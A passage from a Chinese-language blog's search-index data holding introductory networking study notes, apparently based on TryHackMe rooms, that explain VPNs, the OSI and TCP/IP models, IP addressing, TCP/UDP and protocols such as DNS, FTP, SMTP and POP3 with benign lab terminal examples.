具有内置机制来检测这种情况并重新发送。但是，没有任何机制可以确保所有离开或进入计算机的数据都受到保护，不会泄露和更改。一种流行的解决方案是设置 VPN 连接。这里的重点是 VPN 中 Private 的 P。\n几乎所有公司都要求在其虚拟网络中进行“私有”信息交换。因此，VPN 提供了一种非常方便且相对便宜的解决方案。主要要求是 Internet 连接以及 VPN 服务器和客户端。\n下面的网络图显示了一个公司示例，其中有两个远程分支机构连接到 main 分支机构。远程分支中的 VPN 客户端应连接到主分支中的 VPN 服务器。在这种情况下，VPN 客户端将加密流量，并通过已建立的 VPN 隧道（以蓝色显示）将其传递到主分支。VPN 流量仅限于蓝线;绿线将承载解密的 VPN 流量。\n在下面的网络图中，我们看到两个远程用户使用 VPN 客户端连接到主分支中的 VPN 服务器。在这种情况下，VPN 客户端连接单个设备。\n一旦建立了 VPN 隧道，我们所有的 Internet 流量通常都将通过 VPN 连接路由，即通过 VPN 隧道。因此，当我们尝试访问 Internet 服务或 Web 应用程序时，他们不会看到我们的公共 IP 地址，而是 VPN 服务器的地址。这就是为什么一些 Internet 用户通过 VPN 连接以规避地理限制的原因。此外，本地 ISP 只会看到加密流量，这限制了其审查 Internet 访问的能力。\n换句话说，如果用户连接到日本的 VPN 服务器，他们访问的服务器将看起来就像位于日本一样。这些服务器将相应地定制他们的体验，例如将他们重定向到该服务的日本版本。下面的屏幕截图显示了连接到日本的 VPN 服务器后的 Google 搜索页面。\n最后，尽管在许多情况下，人们会建立 VPN 连接以通过 VPN 隧道路由所有流量，但某些 VPN 连接不会这样做。VPN 服务器可能配置为允许您访问私有网络，但不路由您的流量。此外，一些 VPN 服务器会泄露您的实际 IP 地址，尽管它们应该通过 VPN 路由您的所有流量。根据您使用 VPN 连接的原因，您可能需要运行更多测试，例如 DNS 泄漏测试。\n最后，一些国家认为使用 VPN 是非法的，甚至会受到惩罚。在使用 VPN 之前，尤其是在旅行时，请查看当地的法律法规。\n","date":"2025-01-08T00:00:00Z","image":"https://yerucrembed-1314300122.cos.ap-nanjing.myqcloud.com/img/map-of-the-world-2401458.jpg","permalink":"https://Yerucrem.github.io/p/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%8D%8F%E8%AE%AE/","title":"网络安全协议"},{"content":"OSI please do not throw spinach pizza away\nLayer 1: Physical Layer 物理层处理设备之间的物理连接;这包括介质 （如线路） 以及二进制数字 0 和 1 的定义。数据传输可以通过电、光学或无线信号进行。因此，我们需要数据线或天线，具体取决于我们的物理介质。\nLayer 2: Data Link Layer 数据链路层，代表实现同一网段节点之间数据传输的协议。让我们用更简单的术语来表达。数据链路层描述了同一网段上不同系统之间关于如何通信的协议。网段是指使用共享介质或通道进行信息传输的一组联网设备。例如，假设公司办公室有 10 台计算机连接到网络交换机;那是一个网段。\n第 2 层的示例包括以太网（即 802.3）和 WiFi（即 802.11）。以太网和 WiFi 地址为 6 个字节。它们的地址称为 MAC 地址，其中 MAC 代表媒体访问控制。它们通常以十六进制格式表示，每两个字节之间用冒号分隔。最左边的三个字节标识供应商。\nLayer 3: Network Layer 网络层，关注在不同网络之间发送数据。用更专业的术语来说，网络层处理逻辑寻址和路由，即找到在不同网络之间传输网络数据包的路径。\n在数据链路层，我们给出了一个公司办公室有 10 台计算机的示例，其中数据链路层负责在它们之间提供连接。假设这家公司在多个办事处，分布在不同的城市、国家甚至大洲。网络层负责将不同的办公室连接在一起。\n下面的网络显示计算机 A 和 B 已连接，尽管位于不同的网络上。您还可以注意到连接两台计算机的两条路径;网络层将通过其认为更好的路径路由网络数据包。\n网络层的示例包括 Internet 协议 （IP）、Internet 控制消息协议 （ICMP） 和虚拟专用网络 （VPN） 协议，例如 IPSec 和 SSL/TLS VPN。\nLayer 4: Transport Layer 传输层支持不同主机上正在运行的应用程序之间的端到端通信。您的 Web 浏览器通过传输层连接到 TryHackMe Web 服务器，该服务器可以支持流控制、分段和纠错等各种功能。\n第 4 层的示例包括传输控制协议 （TCP） 和用户数据报协议 （UDP）。\nLayer 5: Session Layer 会话层负责建立、维护和同步在不同主机上运行的应用程序之间的通信。建立会话意味着启动应用程序之间的通信并协商会话的必要参数。数据同步可确保数据以正确的顺序传输，并提供在传输失败时恢复的机制。\n会话层的示例包括网络文件系统 （NFS） 和远程过程调用 （RPC）。\nLayer 6: Presentation Layer 表示层确保以应用程序层可以理解的形式交付数据。第 6 层处理数据编码、压缩和加密。编码的一个示例是字符编码，例如 ASCII 或 Unicode。\n表示层采用多种标准化格式。 以电子邮件发送图像场景为例：首先使用JPEG、GIF、PNG格式存储图像；随后通过MIME（多用途互联网邮件扩展）协议将文件附加至邮件，虽然邮件客户端对用户隐藏了这一过程。MIME协议通过7位ASCII字符实现二进制文件编码。\nLayer 7: Application Layer 应用层直接向最终用户应用程序提供网络服务。您的 Web 浏览器将使用 HTTP 协议来请求文件、提交表单或上传文件。\n应用程序层是顶层，当您使用不同的应用程序时，您可能已经遇到了它的许多协议。第 7 层协议的示例包括 HTTP、FTP、DNS、POP3、SMTP 和 IMAP。\nSummary 层数 图层名称 主要功能 示例协议和标准 第 7 层 Application layer 应用层 为应用程序提供服务和接口 HTTP, FTP, DNS, POP3, SMTP, IMAP HTTP、FTP、DNS、POP3、SMTP、IMAP 第 6 层 Presentation layer 表示层 数据编码、加密和压缩 Unicode, MIME, JPEG, PNG, MPEG Unicode 、MIME、JPEG、PNG、MPEG 第 5 层 Session layer 会话层 建立、维护和同步会话 NFS, RPC NFS 和 RPC 第 4 层 Transport layer 传输层 端到端通信和数据分段 UDP, TCP UDP、TCP 第 3 层 Network layer 网络层 网络之间的逻辑寻址和路由 IP, ICMP, IPSec IP、ICMP、IPSec 第 2 层 Data link layer 数据链路层 相邻节点之间的可靠数据传输 以太网 （802.3）、WiFi （802.11） 第 1 层 Physical layer 物理层 物理数据传输介质 电气、光学和无线信号 TCP/IP 网络架构演进解析 在完成ISO OSI参考模型的理论学习后，我们将转向实际应用的TCP/IP协议体系。该模型由传输控制协议（TCP）和互联网协议（IP）构成核心，系美国国防部（DoD）于20世纪70年代主导研发。\n关键技术特性解析：\n军事级容错设计 您可能会问：为何国防部要开发该模型？其核心优势在于实现网络的\u0026quot;去中心化生存能力\u0026quot;——即使部分节点因军事打击失效，网络仍可维持基本通信能力。 自适应路由机制 这种韧性源于动态路由协议的设计创新，通过OSPF、BGP等协议实时感知网络拓扑变化，智能调整数据包传输路径（参见RFC 791/793）。 在我们介绍 ISO OSI 模型时，我们从下到上，从第 1 层到第 7 层。在这个任务中，让我们从不同的角度，从上到下看事情。从上到下，我们有：\nApplication Layer 应用层 ：OSI 模型应用层、表示层和会话层，即第 5、6 和 7 层，在 TCP/IP 模型中被分组到应用层中。\nTransport Layer 传输层 ：这是第 4 层。\nInternet Layer Internet 层 ：这是第 3 层。OSI 模型的网络层在 TCP/IP 模型中称为 Internet 层。\n**Link Layer 链接层 **：这是第 2 层。\n下表显示了 TCP/IP 模型层如何映射到 ISO/OSI 模型层。\n层数 ISO OSI 模型 TCP/IP 模型 （RFC 1122） 协议 7 Application Layer 应用层 Application Layer 应用层 HTTP, HTTPS, FTP, POP3, SMTP, IMAP, Telnet, SSH, HTTP、HTTPS、FTP、POP3、SMTP、IMAP、Telnet、SSH 6 Presentation Layer 表示层 5 Session Layer 会话层 4 Transport Layer 传输层 Transport Layer 传输层 TCP, UDP TCP、UDP 3 Network Layer 网络层 Internet Layer Internet 层 IP, ICMP, IPSec IP、ICMP、IPSec 2 Data Link Layer 数据链路层 Link Layer 链接层 Ethernet 802.3, WiFi 802.11 以太网 802.3、WiFi 802.11 1 Physical Layer 物理层 许多现代网络教科书将 TCP/IP 模型显示为 5 层而不是 4 层。例如，在《计算机网络：自上而下的方法第 8 版》中，Kurose 和 Ross 通过包括物理层来描述以下五层 Internet 协议堆栈：\nApplication 应用 Transport 运输 Network 网络 Link 链接 Physical 物理的 IP和子网 当您听到 IP 地址这个词时，您可能会想到 192.168.0.1 之类的地址或不太常见的地址，例如 172.16.159.243。在这两种情况下，你都是对的。这两个地址都是 IP 地址;IPv4（IP 版本 4）地址。\n网络上的每台主机都需要一个唯一标识符，以便其他主机与他通信。如果没有唯一标识符，则无法找到没有歧义的主机。使用 TCP/IP 协议套件时，我们需要为连接到网络的每个设备分配一个 IP 地址。\nIP 地址的一个类比是您的家庭邮政地址。您的邮政地址可让您接收来自世界各地的信件和包裹。此外，它可以毫不含糊地识别您的家;否则，您将无法在线购物！\n您可能已经知道，我们有 IPv4 和 IPv6（IP 版本 6）。IPv4 仍然是最常见的，每当你看到提到 IP 的文本而没有版本时，我们预计它们指的是 IPv4。\n那么，什么是 IP 地址？一个 IP 地址由四个八位字节组成，即 32 位。作为 8 位，八位字节允许我们表示 0 到 255 之间的十进制数。IP 地址如下图所示。\nIPv4地址规范解析 简而言之，IPv4地址段中0与255作为保留地址使用：\n网络标识地址\n示例：192.168.1.0 代表C类网络的基准地址 广播通信地址\n示例：192.168.1.255 作为广播地址，向该地址发送数据将覆盖网络内所有主机 地址容量计算原理：\n理论最大值：基于32位地址空间（2³²）得出约43亿（4,294,967,296）个地址 实际可用量：需扣除各子网的网络地址与广播地址（如示例中的.0和.255） 查找网络配置 可以使用命令 ipconfig 在 MS Windows 命令行上查找您的 IP 地址。在基于 Linux 和 UNIX 的系统上，您可以发出命令 ifconfig 或 ip address show，该命令可以键入 ip a s。在下面的终端窗口中，我们显示 ifconfig。\n1 2 3 4 5 6 7 8 9 10 user@TryHackMe$ ifconfig [...] wlo1: flags=4163\u0026lt;UP,BROADCAST,RUNNING,MULTICAST\u0026gt; mtu 1500 inet 192.168.66.89 netmask 255.255.255.0 broadcast 192.168.66.255 inet6 fe80::73e1:ca5e:3f93:b1b3 prefixlen 64 scopeid 0x20\u0026lt;link\u0026gt; ether cc:5e:f8:02:21:a7 txqueuelen 1000 (Ethernet) RX packets 19684680 bytes 18865072842 (17.5 GiB) RX errors 0 dropped 364 overruns 0 frame 0 TX packets 14439678 bytes 8773200951 (8.1 GiB) TX errors 0 dropped 0 overruns 0 carrier 0 collisions 0 上面的 terminal 输出指示以下内容：\n主机（笔记本电脑）的 IP 地址是 192.168.66.89 子网掩码为 255.255.255.0 广播地址为 192.168.66.255 让我们使用 ip a s 来比较网卡 IP 地址的显示方式\n1 2 3 4 5 6 7 8 9 user@TryHackMe$ ip a s [...] 4: wlo1: \u0026lt;BROADCAST,MULTICAST,UP,LOWER_UP\u0026gt; mtu 1500 qdisc noqueue state UP group default qlen 1000 link/ether cc:5e:f8:02:21:a7 brd ff:ff:ff:ff:ff:ff altname wlp3s0 inet 192.168.66.89/24 brd 192.168.66.255 scope global dynamic noprefixroute wlo1 valid_lft 36795sec preferred_lft 36795sec inet6 fe80::73e1:ca5e:3f93:b1b3/64 scope link noprefixroute valid_lft forever preferred_lft forever 上面的 terminal 输出指示以下内容：\n主机（笔记本电脑）的 IP 地址是 192.168.66.89/24 广播地址为 192.168.66.255 如果您想知道，子网掩码 255.255.255.0 也可以写为 /24。/24 表示 IP 地址中最左边的 24 位在整个网络（即子网）中不会更改。换句话说，最左边的三个八位字节在整个子网中是相同的;因此，我们可以期望找到从 192.168.66.1 到 192.168.66.254 的地址。与前面提到的类似，192.168.66.0 和 192.168.66.255 分别是网络地址和广播地址。\n私有地址 当我们在解释 IP 地址时，值得一提的是，对于大多数实际目的，有两种类型的 IP 地址：\n公网 IP 地址 私有 IP 地址 Request for Comments (RFC) 1918 定义了以下三个私有 IP 地址范围：\n10.0.0.0 - 10.255.255.255 (10/8) 172.16.0.0 - 172.31.255.255 (172.16/12) 192.168.0.0 - 192.168.255.255 (192.168/16) 我们之前提供了一个类比，指出公共 IP 地址就像您的家庭邮政地址。私有 IP 地址是不同的;最初的想法是它无法到达或从外部世界到达。它就像一个孤立的城市或大院，所有的房屋和公寓都被系统地编号，可以很容易地相互交换邮件，但不能与外界交换。要使私有 IP 地址访问 Internet，路由器必须具有公有 IP 地址，并且必须支持网络地址转换 （NAT）。在此阶段，我们不必担心了解 NAT 的工作原理，因为我们将在本模块的后面重新讨论它。\n在继续之前，我建议记住私有 IP 地址范围。否则，您可能会看到 10.1.33.7 或 172.31.33.7 等 IP 地址，并尝试从公有 IP 地址访问它。\n路由 路由器就像您当地的邮局;你把邮件包裹交给他们，他们会知道如何投递。如果我们深入挖掘，您可能会将某些内容邮寄到另一个城市或国家的地址。邮局将检查地址并决定下一步寄往何处。例如，如果要离开该国，我们希望一个中央办公室处理所有国外货物。\n用技术术语来说，路由器将数据包转发到适当的网络。通常，数据包在到达最终目的地之前会经过多个路由器。路由器在第 3 层运行，检查 IP 地址并将数据包转发到最佳网络（路由器），以便数据包更接近其目的地。\nUDP和TCP IP 协议允许我们访问网络上的目标主机;主机由其 IP 地址标识。我们需要使联网主机上的进程能够相互通信的协议。有两种传输协议可以实现此目的：UDP 和 TCP。\nUDP 协议 UDP（用户数据报协议）允许我们访问此目标主机上的特定进程。UDP 是一种简单的无连接协议，在传输层（即第 4 层）运行。无连接意味着它不需要建立连接。UDP 甚至没有提供一种机制来知道数据包已投递。\nIP 地址标识主机;我们需要一种机制来确定发送和接收过程。这可以通过使用端口号来实现。端口号使用两个八位字节;因此，它的范围介于 1 和 65535 之间;端口 0 被保留。（数字 65535 由表达式 216 − 1 计算得出。）\n一个类似于 UDP 的真实示例是标准邮件服务，没有送达确认。换句话说，不能保证已成功接收 UDP 数据包，类似于使用标准邮件发送包裹而不确认送达的情况。对于标准邮件，这意味着比带确认的邮件递送选项更便宜。对于 UDP，这意味着比提供 “确认” 的传输协议更快。\nTCP 协议 TCP（传输控制协议）是一种面向连接的传输协议。它使用各种机制来确保网络主机上不同进程发送的可靠数据交付。与 UDP 一样，它是一个第 4 层协议。由于面向连接，它需要先建立 TCP 连接，然后才能发送任何数据。\n在 TCP 中，每个数据八位字节都有一个序列号;这使得接收方可以轻松识别丢失或重复的数据包。另一方面，接收方使用指定最后接收的八位字节的确认号来确认数据的接收。\nTCP 连接是使用所谓的三次握手建立的。使用了两个标志： SYN （同步） 和 ACK （确认）。数据包的发送方式如下：\nSYN 数据包：客户端通过向服务器发送 SYN 数据包来发起连接。此数据包包含客户端随机选择的初始序列号。\nSYN-ACK 数据包：服务器使用 SYN-ACK 数据包响应 SYN 数据包，该数据包添加服务器随机选择的初始序列号。\nACK 数据包： 当客户端发送 ACK 数据包以确认收到 SYN-ACK 数据包时，三次握手完成。\n与 UDP 类似，TCP 使用端口号标识启动或等待（侦听）连接的过程。如前所述，有效端口号的范围介于 1 和 65535 之间，因为它使用两个八位字节，并且端口 0 是保留的。\n封装 在结束之前，解释另一个关键概念至关重要： 封装 。在这种情况下，封装是指每一层向接收到的数据单元添加标头（有时是尾部）并将“封装”单元发送到下一层的过程。\n封装是一个基本概念，因为它允许每个层专注于其预期功能。在下图中，我们有以下四个步骤：\n应用程序数据 ：当用户输入他们想要发送到应用程序中的数据时，这一切都开始了。例如，您编写电子邮件或即时消息并点击发送按钮。应用程序格式化此数据，并根据使用的应用程序协议开始发送数据，使用其下面的层（传输层）。 传输协议分段或数据报 ：传输层（如 TCP 或 UDP）添加适当的标头信息并创建 TCP 分段 （或 UDP 数据报 ）。此段将发送到其下面的层，即网络层。 网络数据包 ：网络层（即 Internet 层）将 IP 标头添加到接收到的 TCP 分段或 UDP 数据报中。然后，此 IP 数据包被发送到其下面的层，即数据链路层。 数据链路帧 ：以太网或 WiFi 接收 IP 数据包并添加适当的标头和尾部，从而创建一个帧 。 我们从应用程序数据开始。在传输层，我们添加 TCP 或 UDP 标头以创建 TCP 分段或 UDP 数据报 。同样，在网络层，我们添加适当的 IP 报头，以获取可以通过 Internet 路由的 IP 数据包 。最后，我们添加适当的标头和尾部，以在链路层获得 WiFi 或以太网帧。\n该过程必须在接收端反转，直到提取应用程序数据。\n数据包的生命周期 根据我们目前的研究，我们可以解释数据包生命周期的简化版本 。让我们考虑一下你在 TryHackMe 上搜索房间的场景。\n在 TryHackMe 搜索页面上，输入搜索查询并按 Enter。 使用 HTTPS 的 Web 浏览器准备 HTTP 请求并将其推送到其下面的层，即传输层。 TCP 层需要通过浏览器和 TryHackMe Web 服务器之间的三次握手建立连接。建立 TCP 连接后，它可以发送包含搜索查询的 HTTP 请求。创建的每个 TCP 分段都会发送到其下面的层，即 Internet 层。 IP 层添加源 IP 地址（即您的计算机）和目标 IP 地址（即 TryHackMe Web 服务器的 IP 地址）。要使此数据包到达路由器，您的笔记本电脑会将其传送到其下方的层，即链路层。 根据协议，链路层会添加适当的链路层报头和尾部，并将数据包发送到路由器。 路由器删除链路层报头和尾部，检查 IP 目标等字段，并将数据包路由到正确的链路。每个路由器都会重复此过程，直到到达目标服务器的路由器。 然后，当数据包到达目标网络的路由器时，这些步骤将相反。在介绍其他协议时，我们将重新审视此练习并创建更深入的版本。\n远程登陆 TELNET （Teletype Network） 协议是一种用于远程终端连接的网络协议。简而言之，telnet 是一种 TELNET 客户端，允许您连接到远程系统并与之通信，并发出文本命令。虽然最初它用于远程管理，但我们可以使用 telnet 连接到任何监听 TCP 端口号的服务器。\n在目标虚拟机上，正在运行不同的服务。我们将试验其中的三个：\nEcho server：此服务器会回显您发送的所有内容。默认情况下，它侦听端口 7。 aytime server：此服务器默认侦听端口 13 并回复当前日期和时间。 Web （HTTP） 服务器：默认情况下，此服务器侦听 TCP 端口 80 并提供网页。 在继续之前，我们应该提到 echo 和 daytime 服务器被视为安全风险，不应运行;但是，我们显式启动它们是为了演示使用 Telnet 与服务器的通信。在下面的终端中，我们连接到位于 echo 服务器的 TCP 端口号 7 的目标 VM。要关闭连接，请按 CTRL + ] 键同时。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 user@TryHackMe$ telnet 10.10.118.233 7 telnet 10.10.118.233 7 Trying 10.10.118.233... Connected to 10.10.118.233. Escape character is \u0026#39;^]\u0026#39;. Hi Hi How are you? How are you? Bye Bye ^] telnet\u0026gt; quit Connection closed. 在下面的终端中，我们使用 telnet 连接到在端口 13 监听的日间服务器。我们注意到，一旦返回当前日期和时间，连接就会关闭。\n1 2 3 4 5 6 user@TryHackMe$ telnet 10.10.118.233 13 Trying 10.10.118.233... Connected to 10.10.118.233. Escape character is \u0026#39;^]\u0026#39;. Thu Jun 20 12:36:32 PM UTC 2024 Connection closed by foreign host. 最后，让我们使用 telnet 请求一个网页。连接 80 端口后，需要发出命令 GET / HTTP/1.1 并确定任何内容的去向主机，例如 Host： telnet.thm。接下来，您需要按两次 Enter 键，使最后一个输入行为空行。下面的输出显示了交换。（该页面已被编辑。)\n注意 ：发送信息后，您可能必须按 Enter，以免您没有收到回复。\n1 2 3 4 5 6 7 8 9 10 11 12 user@TryHackMe$ telnet 10.10.118.233 80 Trying 10.10.118.233... Connected to 10.10.118.233. Escape character is \u0026#39;^]\u0026#39;. GET / HTTP/1.1 Host: telnet.thm HTTP/1.1 200 OK Content-Type: text/html [...] Connection closed by foreign host. ","date":"2025-01-08T00:00:00Z","image":"https://yerucrembed-1314300122.cos.ap-nanjing.myqcloud.com/img/tomb-8563705.jpg","permalink":"https://Yerucrem.github.io/p/%E7%BD%91%E7%BB%9C%E6%A6%82%E5%BF%B5/","title":"网络概念"},{"content":"DNS：记住地址 您记得您最喜欢的网站的 IP 地址吗？除非是本地设备的私有 IP 地址，否则没有人需要担心记住 IP 地址。这部分是由于域名系统 （DNS） 负责将域名正确映射到 IP 地址。\nDNS 在应用层（即 ISO OSI 模型的第 7 层）运行。DNS 流量默认使用 UDP 端口 53， 使用 TCP 端口 53 作为默认回退。DNS 记录有多种类型;但是，在本任务中，我们将重点介绍以下四个方面：\nA record：A （Address） 记录将主机名映射到一个或多个 IPv4 地址。例如，您可以将 example.com 设置为 resolve 为 172.17.2.172。\nAAAA Record：AAAA 记录类似于 A 记录，但它适用于 IPv6。请记住，它是 AAAA（四 A），因为 AA 和 AAA 指的是电池尺寸;此外，AAA 是指 Authentication、Authorization 和 Accounting;两者都不属于 DNS。\nCNAME Record：CNAME （Canonical Name） 记录将一个域名映射到另一个域名。例如，www.example.com 可以映射到 example.com 甚至 example.org。\nMX Record：MX （Mail Exchange） 记录指定负责处理域电子邮件的邮件服务器。\n换句话说，当您在浏览器中键入 example.com 时，浏览器会尝试通过查询 DNS 服务器来查询 A 记录来解析此域名。但是，当您尝试向 test@example.com 发送电子邮件时，邮件服务器将查询 DNS 服务器以查找 MX 记录。\n如果要从命令行查找域的 IP 地址，可以使用 nslookup 等工具。考虑下面终端中我们查找 example.com 的示例。\n1 2 3 4 5 6 7 8 9 user@TryHackMe$ nslookup www.example.com Server: 127.0.0.53 Address: 127.0.0.53#53 Non-authoritative answer: Name: www.example.com Address: 93.184.215.14 Name: www.example.com Address: 2606:2800:21f:cb07:6820:80da:af6b:8b2c 上面的查询导致了四个数据包。在下面的终端中，我们可以看到第一个和第三个数据包分别发送了 A 和 AAAA 记录的 DNS 查询。第二个和第四个数据包显示 DNS 查询响应。\n1 2 3 4 5 user@TryHackMe$ tshark -r dns-query.pcapng -Nn 1 0.000000000 192.168.66.89 → 192.168.66.1 DNS 86 Standard query 0x2e0f A www.example.com OPT 2 0.059049584 192.168.66.1 → 192.168.66.89 DNS 102 Standard query response 0x2e0f A www.example.com A 93.184.215.14 OPT 3 0.059721705 192.168.66.89 → 192.168.66.1 DNS 86 Standard query 0x96e1 AAAA www.example.com OPT 4 0.101568276 192.168.66.1 → 192.168.66.89 DNS 114 Standard query response 0x96e1 AAAA www.example.com AAAA 2606:2800:21f:cb07:6820:80da:af6b:8b2c OPT WHOIS 在上一个任务中，我们介绍了如何将域名解析为 IP 地址。但是，要实现此目的，需要有人有权为域设置 A、AAAA 和 MX 记录以及其他 DNS 记录。注册域名的人被授予此权力。因此，如果您注册 example.com，则可以为 example.com 设置任何有效的 DNS 记录。\n您可以注册任何可用的域名一年或多年。您需要支付年费，并且需要提供作为注册人的准确联系信息 。此信息是通过 WHOIS 记录提供的数据的一部分，并且是公开的。（虽然 WHOIS 是大写的，但它不是首字母缩略词;它的发音是 who。但是，如果您想在不公开透露联系信息的情况下注册域，请不要担心;您可以使用其中一种隐私服务，从 WHOIS 记录中隐藏您的所有信息。\n您可以使用在线服务之一或通过命令行工具 whois 查找任何注册域名的 WHOIS 记录，该工具可在 Linux 系统上使用，等等。正如预期的那样，WHOIS 记录提供了有关注册域名的实体的信息，包括名称、电话号码、电子邮件和地址。在下面显示的屏幕截图中，您可以看到记录的首次创建时间和上次更新时间。此外，您可以找到注册人的姓名、地址、电话和电子邮件。\n在下面的终端输出中，我们使用了 whois 命令来查找其 WHOIS 记录受隐私保护保护的域。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 user@TryHackMe$ whois [REDACTED].com [...] Domain Name: [REDACTED].COM Registry Domain ID: [REDACTED] Registrar WHOIS Server: whois.godaddy.com Registrar URL: https://www.godaddy.com Updated Date: 2017-07-05T16:02:43Z Creation Date: 1993-04-02T00:00:00Z Registrar Registration Expiration Date: 2026-10-20T14:56:17Z Registrar: GoDaddy.com, LLC Registrar IANA ID: 146 Registrar Abuse Contact Email: abuse@godaddy.com Registrar Abuse Contact Phone: +1.4806242505 [...] Registrant Name: Registration Private Registrant Organization: Domains By Proxy, LLC Registrant Street: DomainsByProxy.com [...] HTTP(S)：访问web 当您启动浏览器时，您主要使用 HTTP 和 HTTPS 协议。HTTP 代表超文本传输协议;HTTPS 中的 S 代表安全。此协议依赖于 TCP 并定义 Web 浏览器与 Web 服务器的通信方式。\n您的 Web 浏览器通常向 Web 服务器发出的一些命令或方法是：\nGET 从服务器检索数据，例如 HTML 文件或图像。 POST 允许我们向服务器提交新数据，例如提交表单或上传文件。 PUT 用于在服务器上创建新资源以及更新和覆盖现有信息。 DELETE，顾名思义，用于删除服务器上的指定文件或资源。 HTTP 和 HTTPS 通常分别使用 TCP 端口 80 和 443，其他端口（如 8080 和 8443）不太常用。\n在以下示例中，我们使用 Firefox 浏览器访问 10.10.28.0 上的 Web 服务器。我们的浏览器获取网页并完美地显示它;但是，我们对幕后发生的事情感兴趣。\n使用 Wireshark，我们可以更仔细地检查 Firefox 浏览器和 Web 服务器之间的交换。下面来自 Wireshark 的屏幕截图以红色显示我们的浏览器发送的文本，以蓝色显示 Web 服务器响应。正如你所看到的，客户端和服务器之间交换了很多信息，这些信息没有呈现给用户。示例包括 Web 服务器版本和上次修改页面的时间。\nFTP：传输文件 与旨在检索网页的 HTTP 不同，文件传输协议 （FTP） 旨在传输文件。因此，FTP 对于文件传输非常有效，当所有条件都相同时，它可以实现比 HTTP 更高的速度。\nFTP 协议定义的命令示例包括：\nUSER 用于输入用户名 PASS 输入密码 RETR （retrieve） 用于将文件从 FTP 服务器下载到客户端。 STOR（存储）用于将文件从客户端上传到 FTP 服务器。 FTP 服务器默认监听 TCP 端口 21;数据传输是通过从客户端到服务器的另一个连接进行的。\n在下面的终端中，我们执行命令 ftp 10.10.28.0 以使用本地 ftp 客户端连接到远程 FTP 服务器。然后我们执行以下步骤：\n我们使用用户名 anonymous 登录 我们不需要提供任何密码 发出 ls 返回可供下载的文件列表 键入 ASCII 切换到 ASCII 模式，因为这是一个文本文件 get coffee.txt 允许我们检索所需的文件 通过 FTP 客户端进行的命令交换显示在下面的终端中。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 user@TryHackMe$ ftp 10.10.28.0 Connected to 10.10.28.0 (10.10.28.0). 220 (vsFTPd 3.0.5) Name (10.10.28.0:strategos): anonymous 331 Please specify the password. Password: 230 Login successful. Remote system type is UNIX. Using binary mode to transfer files. ftp\u0026gt; ls 227 Entering Passive Mode (10,10,41,192,134,10). 150 Here comes the directory listing. -rw-r--r-- 1 0 0 1480 Jun 27 08:03 coffee.txt -rw-r--r-- 1 0 0 14 Jun 27 08:04 flag.txt -rw-r--r-- 1 0 0 1595 Jun 27 08:05 tea.txt 226 Directory send OK. ftp\u0026gt; type ascii 200 Switching to ASCII mode. ftp\u0026gt; get coffee.txt local: coffee.txt remote: coffee.txt 227 Entering Passive Mode (10,10,41,192,57,100). 150 Opening BINARY mode data connection for coffee.txt (1480 bytes). WARNING! 47 bare linefeeds received in ASCII mode File may not have transferred correctly. 226 Transfer complete. 1480 bytes received in 8e-05 secs (18500.00 Kbytes/sec) ftp\u0026gt; quit 221 Goodbye. 我们使用 Wireshark 更仔细地检查交换的消息。客户端的消息为红色 ，而服务器的响应为蓝色 。请注意客户端和服务器之间的各种命令有何不同。例如，当您在客户端上键入 ls 时，客户端会将 LIST 发送到服务器。最后要注意的一点是，目录列表和我们下载的文件都是通过单独的连接发送的。\nSMTP：发送电子邮件 与浏览 Web 和下载文件一样，发送电子邮件需要自己的协议。Simple Mail Transfer Protocol （SMTP） 定义邮件客户端如何与邮件服务器通信，以及邮件服务器如何与另一个邮件服务器通信。\nSMTP 协议的类比是当您去当地邮局发送包裹时。您向员工打招呼，告诉他们您想将包裹寄往何处，并在将包裹交给他们之前提供发件人的信息。根据您所在的国家/地区，系统可能会要求您出示身份证。此过程与 SMTP 会话没有太大区别。\n让我们介绍一下您的邮件客户端在将电子邮件传输到 SMTP 服务器时使用的一些命令：\nHELO 或 EHLO 启动 SMTP 会话 MAIL FROM 指定发件人的电子邮件地址 RCPT TO 指定收件人的电子邮件地址 DATA 表示客户端将开始发送电子邮件内容 . 单独在一行上发送，以指示电子邮件消息的结尾 下面的终端显示了通过 telnet 发送的电子邮件示例。 默认情况下，SMTP 服务器侦听 TCP 端口 25。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 user@TryHackMe$ telnet 10.10.28.0 25 Trying 10.10.28.0... Connected to 10.10.28.0. Escape character is \u0026#39;^]\u0026#39;. 220 example.thm ESMTP Exim 4.95 Ubuntu Thu, 27 Jun 2024 16:18:09 +0000 HELO client.thm 250 example.thm Hello client.thm [10.11.81.126] MAIL FROM: \u0026lt;user@client.thm\u0026gt; 250 OK RCPT TO: \u0026lt;strategos@server.thm\u0026gt; 250 Accepted DATA 354 Enter message, ending with \u0026#34;.\u0026#34; on a line by itself From: user@client.thm To: strategos@server.thm Subject: Telnet email Hello. I am using telnet to send you an email! . 250 OK id=1sMrpq-0001Ah-UT QUIT 221 example.thm closing connection Connection closed by foreign host. 显然，使用 telnet 发送电子邮件非常麻烦;但是，它可以帮助您更好地了解电子邮件客户端在后台发出的命令。Wireshark 捕获以颜色显示交换;客户端的消息为红色，而服务器的响应为蓝色。\nPOP3：接收电子邮件 您收到了一封电子邮件，并希望将其下载到本地邮件客户端。邮局协议版本 3 （POP3） 旨在允许客户端与邮件服务器通信并检索电子邮件消息。\n无需深入的技术细节，电子邮件客户端依靠 SMTP 发送其消息，并使用 POP3 检索它们。SMTP 类似于将信封或包裹交给邮局， 而 POP3 类似于检查本地邮箱是否有新的信件或包裹。\n一些常见的 POP3 命令包括：\nUSER \u0026lt;username\u0026gt; 标识用户 PASS \u0026lt;password\u0026gt; 提供用户的密码 STAT 请求消息数和总大小 LIST 列出所有邮件及其大小 RETR \u0026lt;message_number\u0026gt; 检索指定的消息 DELE \u0026lt;message_number\u0026gt; 将邮件标记为删除 QUIT 结束 POP3 会话，应用更改，例如删除 在下面的终端中，我们可以看到一个通过 telnet 的 POP3 会话。由于 POP3 服务器默认监听 TCP 端口 110，因此连接到 TELNET 端口的命令是 telnet 10.10.28.0 110。下面的 exchange 检索在上一个任务中发送的电子邮件。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 user@TryHackMe$ telnet 10.10.28.0 110 Trying 10.10.28.0... Connected to 